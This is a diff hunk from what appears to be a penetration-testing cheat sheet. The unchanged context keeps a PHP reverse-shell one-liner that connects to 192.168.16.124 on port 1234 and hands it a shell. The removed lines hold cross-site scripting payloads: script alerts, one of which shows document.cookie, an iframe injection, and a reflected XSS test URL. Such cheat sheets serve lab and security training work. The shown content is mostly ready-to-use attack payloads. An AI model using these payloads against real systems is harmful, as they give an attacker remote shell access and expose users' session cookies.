@@ -9,17 +9,6 @@ Reverse shell one-liners:
 <?php $s=fsockopen("192.168.16.124",1234);exec("sh<&3>&3 2>&3") ;?>
 
 
-XSS (CROSS SITE SCRIPTING)
-==========================
-
-```javascript
-<script>alert("XSS")</script>
-<script>alert(document.cookie)</script>
-```
-
-iframe: `<iframe src="http://www.cnn.com"></iframe>`  
-Stored cookie: `<script>alert(document.cookie)</script>`
-Refleced (vulnerable parameter): `http://localhost/xss_r/?name=<script>alert(document.cookie)</script`
 
 
 COMMAND INJECTION
